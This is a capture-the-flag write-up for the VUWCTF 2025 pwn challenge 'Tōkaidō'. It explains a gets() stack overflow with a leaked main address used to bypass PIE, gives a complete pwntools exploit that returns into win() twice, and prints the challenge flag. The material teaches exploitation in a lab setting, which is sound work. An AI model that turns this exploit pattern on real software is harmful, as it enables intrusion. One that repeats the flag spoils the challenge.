---
ctf: VUWCTF 2025
category: pwn
difficulty: easy
points: 100
flag: "VuwCTF{eastern_sea_route}"
techniques: [stack_overflow, ret2win, double_return]
tools: [pwntools]
---

# Tōkaidō

## Description
Buffer overflow with PIE bypass, requiring double return to win function.

## Vulnerability

- `gets()` on a 16-byte buffer - classic stack overflow
- No stack canary
- PIE enabled, but main's address is leaked

## Solution

### The Trick
The `win()` function checks if `(attempts++ > 0)` before printing the flag. Since attempts starts at 0, we need to call `win()` twice:

1. **First call**: attempts is 0 → prints "not attempted", increments to 1
2. **Second call**: attempts is 1 → prints the flag

### Exploit

```python
from pwn import *

p = remote('tokaido.challenges.2025.vuwctf.com', 9983)

# Parse leaked main address
p.recvuntil(b'funny number: ')
main_leak = int(p.recvline().strip(), 16)

# Calculate win address (PIE bypass)
base = main_leak - 0x12ce
win = base + 0x1229

# Payload: buffer(16) + rbp(8) + win + win
payload = b'A'*16 + b'B'*8 + p64(win) + p64(win)
p.sendline(payload)
p.interactive()
```

## Key Techniques
- Classic stack buffer overflow via `gets()`
- PIE bypass via leaked address
- Double-return to satisfy counter check
- ROP chain construction
